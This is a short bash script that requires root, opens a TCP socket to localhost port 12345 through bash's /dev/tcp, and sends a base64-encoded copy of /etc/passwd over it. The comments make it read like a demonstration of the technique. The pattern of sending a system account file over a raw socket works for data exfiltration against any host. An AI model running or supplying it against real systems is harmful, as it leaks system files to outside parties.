#!/bin/bash

# Verify that the script is running as root (UID 0); if not, inform the user.
if [[ $UID != 0 ]]
	then
		echo "Please run this script as root: sudo $0 $*"
		exit 1
fi

# Generate a random number for our file descriptor, within the range 6-254.
lower=6					# lower limit
upper=254				# upper limit
fd=0					# initialize the variable for the file descriptor
## Set up a loop that will generate a random number until it produces one that
## is larger than the lower bound.
while [ "$fd" -le $lower ]
	do
		fd=$RANDOM
		let "fd%=$upper"
done

# Create the file descriptor using exec().
# (Note - as the shell does not allow us to specify a variable as the file
#  descriptor, we will wrap our redirection command within an eval expression.)
hostname="localhost"
port="12345"
echo "Creating a session between ${hostname}:${port} and file descriptor $fd..."
eval exec "${fd}""<>/dev/tcp/$hostname/$port"
## Verify that the file descriptor exists, and print its location and target.
echo "Created file descriptor ${fd}: $( stat --format=%N /proc/$$/fd/$fd )"
echo ""

# Encode and send data through the pipe.
file="/etc/passwd"
echo "Base64 encoding $file and passing to the pipe..."
eval base64 $file >&"${fd}"
echo "Done"
echo ""

# Clean up the file descriptor, now that we are finished with it.
echo "Closing file descriptor $fd..."
eval exec "${fd}"'<&-'
echo "Done"

# Exit successfully.
exit 0